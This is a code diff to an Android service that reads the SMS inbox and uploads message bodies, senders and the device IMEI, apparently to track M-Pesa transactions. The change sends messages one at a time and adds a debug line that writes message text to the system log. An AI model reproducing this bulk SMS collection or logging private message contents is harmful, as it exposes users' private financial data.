@@ -58,8 +58,8 @@ public class SMSService extends Service {
                 cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
                 if (cursor != null) {
                     if (cursor.moveToFirst()) {
-                        List<MpesaMsg> mpesaMsgs = new ArrayList<>();
                         for (int idx = 0; idx < cursor.getCount(); idx++) {
+                            List<MpesaMsg> mpesaMsgs = new ArrayList<>();
                             String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                             String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                             String person = cursor.getString(cursor.getColumnIndexOrThrow("person"));
@@ -84,10 +84,10 @@ public class SMSService extends Service {
                             } else {
                                 MpesaMsg mpesaMsg = new MpesaMsg(imei, msg, address, person);
                                 mpesaMsgs.add(mpesaMsg);
+                                postMpesaMsg(mpesaMsgs);
                             }
                             cursor.moveToNext();
                         }
-                        postMpesaMsg(mpesaMsgs);
                         cursor.close();
                     }
                 }
@@ -111,6 +111,7 @@ public class SMSService extends Service {
     }
 
     private void postMpesaMsg(List<MpesaMsg> mpesaMsgs){
+        Log.d("fvdf...........", mpesaMsgs.get(0).getMsg());
         smsServiceInterface.postMpesaMsg(mpesaMsgs).enqueue(new Callback<String>() {
             @Override
             public void onResponse(Call<String> call, Response<String> response) {
